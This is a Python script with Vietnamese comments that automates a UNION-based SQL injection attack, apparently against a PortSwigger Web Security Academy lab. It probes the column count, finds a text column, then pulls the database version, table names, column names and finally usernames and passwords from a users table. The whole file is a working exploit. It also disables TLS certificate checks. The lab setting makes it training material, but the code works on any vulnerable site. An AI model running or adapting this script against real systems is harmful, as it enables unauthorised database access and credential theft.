import requests
import urllib3
from urllib.parse import quote
from urllib3.exceptions import InsecureRequestWarning
# Tắt cảnh báo SSL không xác thực
urllib3.disable_warnings(InsecureRequestWarning)
url = "https://0a34002704d0a87280ce94b6009800f9.web-security-academy.net/filter?category=Gifts"
headers = {
    "Host": "0a1800b10401a259808071c2001700fd.web-security-academy.net",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br"
}
def tim_cot(url):
    for i in range(1, 100):
        payload = f"' ORDER BY {i} --"
        try:
            r = requests.get(url + quote(payload), verify=False, timeout=5)
            response = r.text
            # Kiểm tra lỗi trong phản hồi
            if "Internal Server Error" in response:
                return i - 1  
        except requests.exceptions.RequestException as e:
            print(f"Lỗi: {e}")
            return False  

    return False  # Trả về False nếu không xác định được số cột
def tim_chuoi(column_count):
    for i in range(column_count):
        payload = f"' UNION SELECT {','.join(['NULL']*i + ["'test'"] + ['NULL']*(column_count - i - 1))} --"
        try:
            r = requests.get(url + quote(payload), verify=False, timeout=5)
            response = r.text
            if "test" in response:
                print(f"Cột thứ {i+1} là kiểu STRING")
                return i + 1
        except requests.exceptions.RequestException as e:
            print(f"Lỗi: {e}")
            
def xem_phien_ban(column_count):
    payload = f"' UNION SELECT {','.join(['NULL']*(column_count-1) + ['version()'])} -- "
    r = requests.get(url + quote(payload), verify=False)
    response = r.text
    print(f"Phiên bản CSDL: {response}")

# 4. Lấy danh sách bảng
def xem_danh_sach_bang(column_count):
    payload = f"' UNION SELECT {','.join(['NULL']*(column_count-1) + ['tablename'])} FROM pg_tables -- "
    r = requests.get(url + quote(payload), verify=False)
    response = r.text
    print(f"Danh sách bảng: {response}")

# 5. Lấy danh sách cột từ bảng users
def xem_danh_sach_cot(column_count, tablename):
    payload = f"' UNION SELECT {','.join(['NULL']*(column_count-1) + ['column_name'])} FROM information_schema.columns WHERE table_name='{tablename}' -- "
    r = requests.get(url + quote(payload), verify=False)
    response = r.text
    print(f"Danh sách cột bảng users: {response}")

# 6. Lấy username và password
def xem_username_password(column_count, tablename):
    payload = f"' UNION SELECT {','.join(['NULL']*(column_count-1) + ["username||'~'||password"])} FROM users -- "
    r = requests.get(url + quote(payload), verify=False)
    response = r.text
    print(f"Thông tin đăng nhập: {response}")
if __name__ == "__main__":
    column_count = tim_cot(url)
    if column_count:
        tim_chuoi(column_count)
        xem_phien_ban(column_count)
        xem_danh_sach_bang(column_count)
        tablename = input('nhap ten bang : ')
        xem_danh_sach_cot(column_count, tablename)
        xem_username_password(column_count, "")